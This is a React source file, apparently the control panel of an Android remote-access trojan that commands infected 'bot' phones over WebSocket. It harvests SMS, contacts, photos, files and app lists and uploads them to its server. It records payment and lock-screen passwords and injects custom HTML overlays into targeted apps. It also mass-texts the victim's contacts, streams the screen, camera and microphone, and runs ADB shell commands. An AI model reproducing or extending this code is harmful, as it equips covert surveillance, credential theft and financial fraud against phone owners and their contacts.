  async function clearPayRecords() { if (!confirm('确定清空所有支付密码记录吗？')) return; try { await api.request(`/api/payment-cipher-records?device_id=${encodeURIComponent(resolvedDeviceId)}`, { method: 'DELETE' }); setPayRecords([]); setPayRecordsTotal(0); centerToast('已清空') } catch {} }
  async function deletePayRecord(id) { try { await api.request(`/api/payment-cipher-records/${id}`, { method: 'DELETE' }); centerToast('已删除'); loadPayRecords() } catch {} }


  // 短信相关函数
  async function loadSms(page = smsPage, size = smsSize, search = smsSearch) {
    setSmsLoading(true)
    try {
      const params = new URLSearchParams({ page: String(page), pageSize: String(size) })
      if (resolvedDeviceId) params.append('deviceId', resolvedDeviceId)
      if (search) params.append('search', search)
      const r = await api.request(`/api/sms/notifications?${params}`)
      const list = r?.data?.list || r?.data?.messages || r?.data?.items || r?.messages || r?.items || r?.data
      setSmsList(Array.isArray(list) ? list : [])
      setSmsTotal(r?.data?.total || r?.total || (Array.isArray(list) ? list.length : 0))
      setSmsPage(page)
      setSmsSize(size)
    } catch (e) { setSmsList([]); setSmsTotal(0) }
    finally { setSmsLoading(false) }
  }
  function readDeviceSms() {
    setSmsLoading(true)
    sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'SMS_READ', params: { limit: 9999 } } })
    addLog('发送: SMS_READ')
    setTimeout(() => setSmsLoading(false), 15000)
  }
  async function sendSmsToDevice() {
    if (!smsPhone.trim()) { toast('请输入手机号', 'error'); return }
    if (!smsContent.trim()) { toast('请输入短信内容', 'error'); return }
    setSmsSending(true)
    try {
      sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'SMS_SEND', params: { phoneNumber: smsPhone.trim(), message: smsContent.trim(), simSlot: Number(smsSim) } } })
      centerToast('短信发送指令已下发')
      addLog(`发送短信至 ${smsPhone.trim()} (卡${Number(smsSim) + 1})`)
    } catch (e) { toast(e.message, 'error') }
    finally { setSmsSending(false) }
  }

  // 通讯录相关函数
  function fetchContacts() {
    setContactsLoading(true)
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'GET_CONTACTS', params: { limit: 500 } }, timestamp: Date.now() })
    addLog('发送: 获取通讯录')
    setTimeout(() => setContactsLoading(false), 8000)
  }
  function getFilteredContacts() {
    if (!contactsSearch.trim()) return contactsList
    const kw = contactsSearch.trim().toLowerCase()
    return contactsList.filter(c => (c.name || '').toLowerCase().includes(kw) || (c.phone || c.number || '').includes(kw))
  }

  // 群发短信相关函数
  function fetchBulkContacts() {
    setBulkContactsLoading(true)
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'GET_CONTACTS', params: { limit: 500 } }, timestamp: Date.now() })
    centerToast('正在获取通讯录...')
    addLog('群发: 获取通讯录')
    setTimeout(() => setBulkContactsLoading(false), 8000)
  }
  function handleBulkSend() {
    if (!bulkSmsContent.trim()) { toast('请输入短信内容', 'error'); return }
    if (bulkSelected.size === 0) { toast('请选择联系人', 'error'); return }
    const contacts = contactsList.length > 0 ? contactsList : bulkContacts
    if (!window.confirm(`将向 ${bulkSelected.size} 个联系人发送短信，确认发送？`)) return
    setBulkSending(true)
    const selectedContacts = contacts.filter((_, i) => bulkSelected.has(i))
    let sent = 0
    const sendNext = () => {
      if (sent >= selectedContacts.length) {
        setBulkSending(false)
        centerToast(`群发完成，共发送 ${selectedContacts.length} 条`)
        addLog(`群发完成: ${selectedContacts.length} 条`)
        return
      }
      const contact = selectedContacts[sent]
      const phone = contact.phone || contact.number || contact.phoneNumber || ''
      if (phone) {
        sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'SMS_SEND', params: { phoneNumber: phone, message: bulkSmsContent.trim(), simSlot: Number(bulkSmsSim) } } })
        addLog(`群发 ${sent + 1}/${selectedContacts.length}: ${phone}`)
      }
      sent++
      setTimeout(sendNext, 500)
    }
    sendNext()
  }

  // 相册相关函数
  function fetchGallery() {
    setGalleryLoading(true)
    const limit = galleryCount ? Number(galleryCount) : 9999
    sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'ALBUM_READ_THUMBNAILS', params: { limit, thumbnail: true, thumbnailSize: 300 } } })
    addLog('发送: ALBUM_READ_THUMBNAILS')
    setTimeout(() => setGalleryLoading(false), 15000)
  }

  // 文件管理相关函数
  function fmNavigate(path) {
    setFmPath(path)
    setFmFiles([])
    setFmSelected(new Set())
    setFmLoading(true)
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'FILE_LIST', params: { path } }, timestamp: Date.now() })
    addLog(`浏览目录: ${path}`)
    setTimeout(() => setFmLoading(false), 10000)
  }
  function fmGoUp() {
    const parts = fmPath.split('/').filter(Boolean)
    if (parts.length <= 1) { fmNavigate('/'); return }
    parts.pop()
    fmNavigate('/' + parts.join('/'))
  }
  function fmRefresh() { fmNavigate(fmPath) }
  function fmGoRoot() { fmNavigate('/sdcard') }
  function fmOpenItem(item) {
    if (item.isDir || item.type === 'directory') {
      const newPath = fmPath === '/' ? `/${item.name}` : `${fmPath}/${item.name}`
      fmNavigate(newPath)
    }
  }
  function fmDelete(item) {
    if (!confirm(`确定删除 ${item.name}?`)) return
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'FILE_DELETE', params: { path: `${fmPath}/${item.name}` } }, timestamp: Date.now() })
    centerToast(`已发送删除: ${item.name}`)
    setTimeout(fmRefresh, 1500)
  }
  function fmDownload(item) {
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'FILE_DOWNLOAD', params: { path: `${fmPath}/${item.name}` } }, timestamp: Date.now() })
    centerToast(`下载请求已发送: ${item.name}`)
  }
  function fmNewFolder() {
    const name = prompt('新建文件夹名称:')
    if (!name) return
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'FILE_CREATE_FOLDER', params: { path: `${fmPath}/${name}` } }, timestamp: Date.now() })
    centerToast(`新建文件夹: ${name}`)
    setTimeout(fmRefresh, 1500)
  }
  function fmCopy() { if (fmSelected.size === 0) return; setFmClipboard({ action: 'copy', files: [...fmSelected].map(i => fmFiles[i]) }); centerToast(`已复制 ${fmSelected.size} 项`) }
  function fmCut() { if (fmSelected.size === 0) return; setFmClipboard({ action: 'cut', files: [...fmSelected].map(i => fmFiles[i]) }); centerToast(`已剪切 ${fmSelected.size} 项`) }
  function fmPaste() {
    if (!fmClipboard) return
    fmClipboard.files.forEach(f => {
      sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: fmClipboard.action === 'cut' ? 'FILE_MOVE' : 'FILE_COPY', params: { source: f.fullPath || `${f.parentPath || ''}/${f.name}`, destination: `${fmPath}/${f.name}` } }, timestamp: Date.now() })
    })
    centerToast(`粘贴 ${fmClipboard.files.length} 项`)
    if (fmClipboard.action === 'cut') setFmClipboard(null)
    setTimeout(fmRefresh, 2000)
  }
  function fmToggleSelect(idx) { setFmSelected(prev => { const n = new Set(prev); if (n.has(idx)) n.delete(idx); else n.add(idx); return n }) }
  function fmSelectAll() { if (fmSelected.size === fmFiles.length) setFmSelected(new Set()); else setFmSelected(new Set(fmFiles.map((_, i) => i))) }
  function fmFormatSize(bytes) { if (!bytes || bytes === 0) return '-'; if (bytes < 1024) return bytes + ' B'; if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB'; if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB'; return (bytes / 1073741824).toFixed(2) + ' GB' }
  function fmGetFilteredFiles() { if (!fmSearch.trim()) return fmFiles; const kw = fmSearch.trim().toLowerCase(); return fmFiles.filter(f => (f.name || '').toLowerCase().includes(kw)) }

  // 应用列表相关函数
  function fetchAppList() {
    setAppLoading(true)
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'GET_APP_LIST', params: {} }, timestamp: Date.now() })
    addLog('发送: GET_APP_LIST')
    setTimeout(() => setAppLoading(false), 15000)
  }
  function getFilteredApps() {
    if (!appSearch.trim()) return appList
    const kw = appSearch.trim().toLowerCase()
    return appList.filter(a => (a.appName || a.name || '').toLowerCase().includes(kw) || (a.packageName || a.package || '').toLowerCase().includes(kw))
  }
  function uninstallApp(app) {
    if (!confirm(`确定卸载 ${app.appName || app.name}?`)) return
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'UNINSTALL_APP', params: { packageName: app.packageName || app.package } }, timestamp: Date.now() })
    centerToast(`卸载请求: ${app.appName || app.name}`)
  }
  function openApp(app) {
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'LAUNCH_APP', params: { packageName: app.packageName || app.package } }, timestamp: Date.now() })
    centerToast(`打开: ${app.appName || app.name}`)
  }
  function forceStopApp(app) {
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'FORCE_STOP_APP', params: { package: app.packageName || app.package } }, timestamp: Date.now() })
    centerToast(`强制停止: ${app.appName || app.name}`)
  }
  function injectApp(app) {
    sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'INJECT_APP', params: { packageName: app.packageName || app.package } } })
    centerToast(`注入: ${app.appName || app.name}`)
  }
  const [notifyApp, setNotifyApp] = useState(null)
  const [notifyTitle, setNotifyTitle] = useState('')
  const [notifyContent, setNotifyContent] = useState('')
  const [notifyButton, setNotifyButton] = useState('确定')
  function sendAppNotification(app) {
    setNotifyApp(app)
    setNotifyTitle('')
    setNotifyContent('')
    setNotifyButton('确定')
  }
  function confirmSendNotification() {
    if (!notifyApp || !notifyContent.trim()) { centerToast('请输入通知内容', 'err'); return }
    sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'SEND_NOTIFICATION', params: { packageName: notifyApp.packageName || notifyApp.package, appName: notifyApp.appName || notifyApp.name || '', title: notifyTitle, content: notifyContent, buttonText: notifyButton } } })
    centerToast(`通知已发送: ${notifyApp.appName || notifyApp.name}`)
    setNotifyApp(null)
  }
  const [appDetailApp, setAppDetailApp] = useState(null)
  function appDetail(app) {
    setAppDetailApp(app)
  }
  // HTML注入模态框
  const [htmlInjectApp, setHtmlInjectApp] = useState(null)
  const [injectHtmlFile, setInjectHtmlFile] = useState(null)
  const [injectTab, setInjectTab] = useState('upload') // 'upload' | 'custom'
  const [injectCustomHtml, setInjectCustomHtml] = useState('')
  const [injectPreview, setInjectPreview] = useState(false)
  const [injectPreviewHtml, setInjectPreviewHtml] = useState('')
  function showInjectModal(app) {
    setHtmlInjectApp(app)
    setInjectHtmlFile(null)
    setInjectTab('upload')
    setInjectCustomHtml('')
    setInjectPreview(false)
    setInjectPreviewHtml('')
  }
  function stopInjection(app) {
    const pkgName = app.packageName || app.package
    sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'STOP_INJECTION', params: { packageName: pkgName } } })
    centerToast(`已发送关闭注入: ${app.appName || app.name || pkgName}`)
  }
  function confirmInjectHtml() {
    if (!htmlInjectApp) return
    if (!injectCustomHtml.trim()) {
      centerToast('请输入HTML内容', 'err')
      return
    }
    sendWs({
      type: 'command',
      sessionId: resolvedDeviceId,
      data: {
        command: 'SHOW_INJECTION',
        params: {
          packageName: htmlInjectApp.packageName || htmlInjectApp.package,
          htmlContent: injectCustomHtml
        }
      }
    })
    centerToast(`HTML注入已发送: ${htmlInjectApp.appName || htmlInjectApp.name}`)
    setHtmlInjectApp(null)
    setInjectHtmlFile(null)
    setInjectCustomHtml('')
    setInjectPreview(false)
  }

  function wsUrl() { const token = getToken(); const devBackend = /^517\d$/.test(location.port) ? `${location.protocol}//${location.hostname}:8888` : location.origin; const base = (localStorage.getItem('fc_server_url') || devBackend).replace(/^http/, 'ws').replace(/\/$/, ''); return `${base}/ws/panel?token=${encodeURIComponent(token)}` }
  const screenModeRef = useRef(null)
  function connectWs() { if (!resolvedDeviceId) return; try { wsRef.current?.close() } catch {} const ws = new WebSocket(wsUrl()); ws.binaryType = 'arraybuffer'; wsRef.current = ws; setWsState('连接中'); ws.onopen = () => { setWsState('已连接'); addLog('WS 已连接'); ws.send(JSON.stringify({ type: 'subscribe', sessionId: resolvedDeviceId })); ws.send(JSON.stringify({ type: 'get_bot_list' })); ws.send(JSON.stringify({ type: 'ping' })); pingRef.current = Date.now(); pendingWsPayloadsRef.current.splice(0).forEach(p => ws.send(JSON.stringify(p))) }; ws.onclose = (ev) => { setWsState('未连接'); if (ev.code !== 1000 && ev.code !== 1001) { reconnectRef.current = setTimeout(connectWs, 5000) } }; ws.onerror = () => setWsState('错误'); ws.onmessage = evt => { if (evt.data instanceof ArrayBuffer) { if (!screenModeRef.current) return; const u8 = new Uint8Array(evt.data), payload = u8[0] >= 1 && u8[0] <= 8 ? u8.slice(1) : u8; const url = URL.createObjectURL(new Blob([payload], { type: 'image/jpeg' })); setScreenSrc(old => { if (old?.startsWith('blob:')) URL.revokeObjectURL(old); return url }); setScreenLoading(false); setStreaming(true); return } try { const msg = JSON.parse(evt.data); const type = msg.type || msg.event; if (type === 'pong') { setLatency(`${Date.now() - pingRef.current}ms`); return } if (type === 'error') { const msgText = msg.message || '操作失败'; addLog(`错误: ${msgText}`); centerToast(msgText, 'err'); if (String(msgText).includes('不在线')) { setDeviceStatus('offline'); setScreenLoading(false); setStreaming(false); clearInterval(screenshotIntervalRef.current) } return } if (type === 'bot_list' && Array.isArray(msg.data)) { const dev = msg.data.find(b => b.id === resolvedDeviceId || b.botId === resolvedDeviceId || b.deviceId === resolvedDeviceId); if (dev) { setDeviceStatus(dev.status || 'offline'); setDevice(prev => prev ? { ...prev, ...dev } : dev) } return } if (type === 'bot_online') { if (msg.deviceId === resolvedDeviceId || msg.botId === resolvedDeviceId || msg.id === resolvedDeviceId) setDeviceStatus('online'); return } if (type === 'bot_offline') { if (msg.deviceId === resolvedDeviceId || msg.botId === resolvedDeviceId || msg.id === resolvedDeviceId) setDeviceStatus('offline'); return } if (type === 'CONTACTS_DATA' || type === 'contacts_data' || type === 'GET_CONTACTS' || type === 'get_contacts' || (msg.data && (msg.data.type === 'CONTACTS_DATA' || msg.data.type === 'contacts_data' || msg.data.command === 'GET_CONTACTS'))) { const list = msg.contacts || msg.data?.contacts || msg.data?.data?.contacts || (Array.isArray(msg.data?.data) ? msg.data.data : null) || (Array.isArray(msg.data) ? msg.data : []) || []; setContactsList(Array.isArray(list) ? list : []); setContactsTotal(Array.isArray(list) ? list.length : 0); setContactsLoading(false); addLog(`收到通讯录: ${Array.isArray(list) ? list.length : 0} 个联系人`); if (Array.isArray(list) && list.length > 0) { api.request('/api/ai/device-data', { method: 'POST', body: JSON.stringify({ deviceId: resolvedDeviceId, dataType: 'contacts', data: list }) }).catch(() => {}) } return } if (type === 'gallery_image_saved' || type === 'GALLERY_IMAGE_SAVED') { const imgData = msg.data || {}; setGalleryList(prev => [...prev, imgData]); setGalleryTotal(imgData.total || 0); setGalleryLoading(false); return } if (type === 'GALLERY_DATA' || type === 'gallery_data' || type === 'GET_GALLERY' || type === 'get_gallery' || type === 'ALBUM_READ_THUMBNAILS' || type === 'album_read_thumbnails' || type === 'ALBUM_DATA' || type === 'album_data' || type === 'album_thumbnails' || (msg.data && (msg.data.type === 'GALLERY_DATA' || msg.data.type === 'gallery_data' || msg.data.command === 'GET_GALLERY' || msg.data.type === 'ALBUM_READ_THUMBNAILS' || msg.data.type === 'album_data' || msg.data.command === 'ALBUM_READ_THUMBNAILS'))) { const imgs = msg.images || msg.data?.images || msg.photos || msg.data?.photos || msg.data?.data?.images || msg.data?.data?.photos || msg.thumbnails || msg.data?.thumbnails || msg.data?.data?.thumbnails || msg.data?.data || (Array.isArray(msg.data?.data) ? msg.data.data : null) || (Array.isArray(msg.data) && msg.data.length > 0 && typeof msg.data[0] !== 'string' ? msg.data : null) || []; const imgArr = Array.isArray(imgs) ? imgs : []; setGalleryList(prev => [...prev, ...imgArr]); setGalleryTotal(prev => prev + imgArr.length); setGalleryLoading(false); addLog(`收到相册: ${imgArr.length} 张`); return } if (type === 'FILE_LIST' || type === 'file_list' || type === 'LIST_FILES_RESULT' || type === 'LIST_FILES' || type === 'list_files' || type === 'GET_FILE_LIST' || (msg.data && (msg.data.type === 'FILE_LIST' || msg.data.type === 'file_list' || msg.data.command === 'LIST_FILES' || msg.data.command === 'FILE_LIST'))) { const files = msg.files || msg.data?.files || msg.data?.items || msg.data?.data?.files || msg.data?.data?.items || (Array.isArray(msg.data?.data) ? msg.data.data : null) || (Array.isArray(msg.data) ? msg.data : []) || []; setFmFiles(Array.isArray(files) ? files : []); setFmLoading(false); addLog(`收到文件列表: ${Array.isArray(files) ? files.length : 0} 项`); return } if (type === 'APP_LIST' || type === 'app_list' || type === 'APP_LIST_DATA' || type === 'GET_APP_LIST' || type === 'get_app_list' || (msg.data && (msg.data.type === 'APP_LIST' || msg.data.type === 'app_list' || msg.data.command === 'GET_APP_LIST'))) { const apps = msg.apps || msg.data?.apps || msg.data?.list || msg.data?.data?.apps || msg.data?.data?.list || (Array.isArray(msg.data?.data) ? msg.data.data : null) || (Array.isArray(msg.data) ? msg.data : []) || []; setAppList(Array.isArray(apps) ? apps : []); setAppLoading(false); addLog(`收到应用列表: ${Array.isArray(apps) ? apps.length : 0} 个`); if (Array.isArray(apps) && apps.length > 0) { api.request('/api/ai/device-data', { method: 'POST', body: JSON.stringify({ deviceId: resolvedDeviceId, dataType: 'apps', data: apps }) }).catch(() => {}) } return } if (['screenshot', 'screen', 'frame'].includes(type)) { if (!screenModeRef.current) return; const msgDev = msg.deviceId || msg.sessionId || msg.botId; if (msgDev && msgDev !== resolvedDeviceId) return; const src = imageSrc(msg.data || msg.image || msg.payload); if (src) { setScreenSrc(src); setScreenLoading(false); setStreaming(true) } return } if (type === 'password_search_response') { const pwds = msg.passwords || msg.data?.passwords || []; processPwdList(pwds); return }
            // ★ 统一错误拦截：WS回调 success:false 时弹窗显示错误
            if (msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data) && msg.data.success === false) {
              const errMsg = msg.data.error || msg.data.message || '操作失败';
              centerToast(errMsg, 'err');
              addLog(`错误[${type}]: ${errMsg}`);
              return
            }
            // ── ADB 事件监听 ──
            const adbEvents = ['pairing_started', 'pairing_failed', 'direct_pair_start', 'direct_pair_success', 'direct_pair_failed', 'full_deploy_started', 'full_deploy_failed', 'adb_pairing_result'];
            if (adbEvents.includes(type)) {
              addLog(`ADB 事件: ${type} ${msg.data?.error || ''}`);
              if (type === 'pairing_started' || type === 'direct_pair_start') { setAdbPairingState('pairing'); centerToast('ADB 配对进行中...') }
                if (type === 'pairing_failed' || type === 'direct_pair_failed') { setAdbPairingState('failed'); centerToast(`ADB 配对失败: ${msg.data?.error || '未知错误'}`, 'err') }
                if (type === 'direct_pair_success' || type === 'adb_pairing_result') { setAdbPairingState('paired'); centerToast('ADB 配对成功！') }
                if (type === 'full_deploy_started') { setAdbDeploying(true); clearTimeout(adbDeployTimerRef.current); adbDeployTimerRef.current = setTimeout(() => { setAdbDeploying(false); addLog('部署超时，已自动取消状态') }, 120000); centerToast('完整部署已启动，请查看设备屏幕...') }
                if (type === 'full_deploy_failed') { setAdbDeploying(false); clearTimeout(adbDeployTimerRef.current); centerToast(`部署失败: ${msg.data?.error || '未知错误'}`, 'err') }
              return
            }
            // ── Bridge 连接状态 ──
            if (type === 'bridge_connected') {
              setAdbPairingState('paired');
              addLog('✅ Bridge (local-service) 已连接');
              return
            }
            if (type === 'bridge_disconnected') {
              setAdbPairingState('idle');
              addLog('❌ Bridge (local-service) 已断开');
              return
            }
            // ── ADB Agent 状态 ──
            if (type === 'adb_agent_status') {
              const connected = msg.data?.connected === true;
              setAdbAgentConnected(connected);
              addLog(connected ? '✅ ADB Agent (宿主机) 已连接' : '❌ ADB Agent 已断开');
              return
            }
            if (type === 'password_search_response') { const pwds = msg.passwords || msg.data?.passwords || []; processPwdList(pwds); return }
            if (type === 'password_status' || type === 'GET_PASSWORD_STATUS' || (msg.data && msg.data.command === 'GET_PASSWORD_STATUS')) { addLog('密码状态已更新'); api.request(`/api/password-inputs/${encodeURIComponent(resolvedDeviceId)}`).then(r => { const list = Array.isArray(r.data) ? r.data : (r.data?.passwords || r.passwords || []); processPwdList(list) }).catch(() => {}); return }
            if (type === 'password_search_response') { const pwds = msg.passwords || msg.data?.passwords || []; processPwdList(pwds); return }
            // ── 设备屏幕/锁屏状态 → 实时更新在线/休眠 ──
            if (type === 'status' || type === 'screen_lock_status' || type === 'device_status_update') {
              const d = msg.data || {};
              const msgDev = msg.deviceId || msg.sessionId || d.deviceId || '';
              if (msgDev === resolvedDeviceId || !msgDev) {
                if (d.isScreenOn === true) setDeviceStatus('online');
                else if (d.isScreenOn === false) setDeviceStatus('sleeping');
                if (d.type === 'screen_lock_status') return;
              }
            }
            if (type === 'adb_status' || type === 'ADB_STATUS') {
              const status = msg.data || msg.status || {};
              setAdbStatus(prev => ({ ...prev, ...status }));
              addLog(`ADB 状态: ${JSON.stringify(status)}`);
              return
            }
            // ── ADB Agent 日志 ──
            if (type === 'adb_agent_log') {
              const message = msg.data?.message || msg.message || '';
              if (message) {
                setAdbShellHistory(prev => [`[${new Date().toLocaleTimeString()}] [Agent] ${message}`, ...prev].slice(0, 100));
                addLog(`Agent: ${message.substring(0, 80)}`);
              }
              return
            }
            if (type === 'shell_output' || type === 'SHELL_OUTPUT') {
              const output = msg.data?.output || msg.output || msg.data || '';
              if (output) {
                setAdbShellHistory(prev => [`[${new Date().toLocaleTimeString()}] ${output}`, ...prev].slice(0, 100));
                addLog(`Shell: ${output.substring(0, 80)}`);
              }
              return
            }
            if (type === 'accessibility_status' || type === 'ACCESSIBILITY_STATUS' || type === 'QUERY_ACCESSIBILITY_STATUS') {
              const status = msg.data?.status || msg.status || msg.data || '未知';
              setAdbAccessibilityStatus(status);
              addLog(`无障碍状态: ${status}`);
              return
            }
            if (type === 'PERMISSIONS_DATA' || type === 'permissions_data' || type === 'GET_PERMISSIONS' || type === 'get_permissions' || type === 'permissions' || type === 'permissions_response') { const perms = msg.data?.permissions || msg.permissions || msg.data || {}; if (typeof perms === 'object' && !Array.isArray(perms)) { setPermStatus(perms); setPermLoading(false); addLog('收到权限状态') } return }
            if (type === 'gallery_error' || type === 'GALLERY_ERROR') {
              const errMsg = msg.data?.error || msg.error || msg.message || '未知错误';
              setGalleryLoading(false);
              addLog(`相册错误: ${errMsg}`);
              centerToast(`相册读取失败: ${errMsg}`, 'err');
              return
            }
            if (type === 'app_list_response' || type === 'APP_LIST_RESPONSE') { const apps = msg.data?.apps || msg.apps || []; if (Array.isArray(apps)) { setAppList(apps); addLog(`收到应用列表: ${apps.length} 个`); api.request('/api/ai/device-data', { method: 'POST', body: JSON.stringify({ deviceId: resolvedDeviceId, dataType: 'apps', data: apps }) }).catch(() => {}) } else { setAppList([]) } setAppLoading(false); return }
            if (type === 'sms_data' || type === 'SMS_DATA') { const smsList = msg.data?.smsList || msg.smsList || msg.data?.messages || []; if (Array.isArray(smsList) && smsList.length > 0) { setSmsList(smsList); setSmsTotal(msg.data?.count || smsList.length); addLog(`收到短信: ${smsList.length} 条`); api.request('/api/ai/device-data', { method: 'POST', body: JSON.stringify({ deviceId: resolvedDeviceId, dataType: 'sms', data: smsList }) }).catch(() => {}) } setSmsLoading(false); return }
            if (type === 'sms_send_result' || type === 'SMS_SEND_RESULT') { const success = msg.data?.success ?? msg.success; const phone = msg.data?.phoneNumber || msg.phoneNumber || ''; const sim = msg.data?.simSlot ?? msg.simSlot ?? 0; if (success) { centerToast(`短信发送成功: ${phone} (卡${sim + 1})`); addLog(`短信发送成功: ${phone}`) } else { toast(`短信发送失败: ${phone}`, 'error'); addLog(`短信发送失败: ${phone}`) } setSmsSending(false); return }
            if (type === 'injection_status') { const enabledPackages = msg.data?.enabledPackages || msg.enabledPackages || []; if (Array.isArray(enabledPackages)) { setInjActivePkgs(new Set(enabledPackages)); addLog(`注入状态更新: ${enabledPackages.length} 个应用`) } return }
            // ★ 2026-08-06：设备端 debug_log 消息（如 "触摸拦截已启用"）→ 显示 toast
            if (type === 'debug_log' && msg.data?.message) {
              const debugMsg = msg.data.message
              centerToast(debugMsg, 'ok')
              addLog(`设备: ${debugMsg}`)
              // ★ 解锁成功后自动刷新密码（用正确的密码填充输入框）
              if (debugMsg.includes('解锁成功') || debugMsg.includes('unlock') || debugMsg.includes('UNLOCK') || debugMsg.includes('屏幕已解锁')) {
                setTimeout(() => {
                  refreshPwdSummary()
                  setUnlockPwd('')
                  setPatternPwd('')
                  addLog('解锁成功 → 自动刷新密码数据')
                }, 500)
              }
              return
            }
            const readerTypes = ['reader_data', 'accessibility_data', 'ui_hierarchy', 'accessibility_dump']; if (readerTypes.includes(type)) { if (!readerActiveRef.current) return; const msgDev = msg.deviceId || msg.sessionId || msg.botId; if (msgDev && msgDev !== resolvedDeviceId) return; const ts = msg.timestamp || msg.data?.timestamp || 0; if (ts && readerLastTsRef.current && ts <= readerLastTsRef.current) return; if (ts) readerLastTsRef.current = ts; const raw = msg.data?.result || msg.data?.root || msg.data || msg.root; const data = normalizeReaderPayload(raw); if (data) { setReaderData(data); setReaderError(''); readerLoadingRef.current = false; setReaderLoading(false) } return } if (type === 'CAMERA_DATA' || type === 'camera_data' || type === 'CAMERA_FRAME' || type === 'camera_frame' || type === 'camera_capture') { const imgData = msg.image || msg.frame || msg.data?.image || msg.data?.frame || (typeof msg.data === 'string' ? msg.data : ''); if (imgData && camActiveRef.current) { const src = typeof imgData === 'string' ? (imgData.startsWith('data:') ? imgData : `data:image/jpeg;base64,${imgData}`) : ''; if (src) setCamSrc(src) } return } if (type === 'MICROPHONE_DATA' || type === 'microphone_data' || type === 'AUDIO_DATA' || type === 'audio_data' || type === 'RECORDING_DATA' || type === 'MICROPHONE_RESULT') { const audioUrl = msg.url || msg.audioUrl || msg.data?.url || msg.data?.audioUrl; const text = msg.text || msg.data?.text || ''; if (audioUrl) { setMicRecordingUrl(audioUrl); addLog('录音完成') } if (text) { setMicTranscript(text); addLog(`语音识别: ${text.substring(0, 60)}`) } setMicActive(false); return } addLog(`收到: ${type || 'msg'}`) } catch {} } }
  function sendWs(payload) { const ws = wsRef.current; if (ws?.readyState === 1) ws.send(JSON.stringify(payload)); else { pendingWsPayloadsRef.current.push(payload); if (!ws || ws.readyState === 3) connectWs() } }
  function sendCmd(command, params = {}) {
    if (!resolvedDeviceId || !command) return
    const payload = { type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command, params } }
    sendWs(payload)
    addLog(`发送: ${command}`)
  }
  /** 发送 ADB 隧道命令（给 APK 端 adb_tunnel handler） */
  function sendAdbTunnel(command, params = {}) { if (!resolvedDeviceId || !command) return; const payload = { type: 'adb_tunnel', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, command, params }; sendWs(payload); addLog(`ADB隧道: ${command}`) }
  /** 仅通过 bridge HTTP API 发送命令到 local-service（不经过 APK WS） */
  function sendBridgeCmd(command, params = {}) {
    if (!resolvedDeviceId || !command) return
    const token = localStorage.getItem('token') || ''
    const commandId = crypto.randomUUID ? crypto.randomUUID() : `cmd-${Date.now()}-${Math.random().toString(36).slice(2,8)}`
    fetch(`/api/bridge/command/${resolvedDeviceId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
      body: JSON.stringify({ command, params, commandId })
    }).then(r => r.json()).then(res => {
      addLog(`[Bridge] method=${command} commandId=${res.data?.commandId || commandId} → ${res.data?.status || 'ok'}`)
      centerToast(`Bridge: ${command} 已发送`)
    }).catch(e => { addLog(`[Bridge] ${command} 失败: ${e.message}`); centerToast(`Bridge失败: ${e.message}`, 'err') })
  }
  // 页面加载时检查 bridge 状态（查主设备ID和bridge别名）
  useEffect(() => {
    if (!resolvedDeviceId) return
    const token = localStorage.getItem('token') || ''
    // 查主设备 ID
    fetch(`/api/bridge/device/${resolvedDeviceId}`, {
      headers: { 'Authorization': `Bearer ${token}` }
    }).then(r => r.json()).then(res => {
      if (res.data?.connected) {
        setAdbPairingState('paired')
      } else if (res.data?.bridgeId && res.data.bridgeId !== resolvedDeviceId) {
        // 查 bridgeId 别名
        fetch(`/api/bridge/device/${res.data.bridgeId}`, {
          headers: { 'Authorization': `Bearer ${token}` }
        }).then(r2 => r2.json()).then(res2 => {
          if (res2.data?.connected) setAdbPairingState('paired')
        }).catch(() => {})
      }
    }).catch(() => {})
  }, [resolvedDeviceId])
  /** 发送 ADB Shell 命令（给 APK 端 adb_shell handler） */
  function sendAdbShell(shellCmd, params = {}) {
    if (!resolvedDeviceId || !shellCmd) return
    // 1. WebSocket 路径（原有逻辑）
    const payload = { type: 'adb_shell', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, command: shellCmd, params }
    sendWs(payload)
    // 2. HTTP Bridge API 路径（旧前端的 bridge 接口，local-service 直接执行）
    // 解析 shell 命令转为 bridge command 格式
    const parts = shellCmd.trim().split(/\s+/)
    let bridgeCmd = '', bridgeParams = {}
    if (parts[0] === 'input' && parts[1] === 'tap' && parts.length >= 4) {
      bridgeCmd = 'tap'; bridgeParams = { x: parseInt(parts[2]), y: parseInt(parts[3]) }
    } else if (parts[0] === 'input' && parts[1] === 'swipe' && parts.length >= 6) {
      bridgeCmd = 'swipe'; bridgeParams = { x1: parseInt(parts[2]), y1: parseInt(parts[3]), x2: parseInt(parts[4]), y2: parseInt(parts[5]), duration: parseInt(parts[6] || '300') }
    } else if (parts[0] === 'input' && parts[1] === 'keyevent' && parts.length >= 3) {
      const kc = parseInt(parts[2])
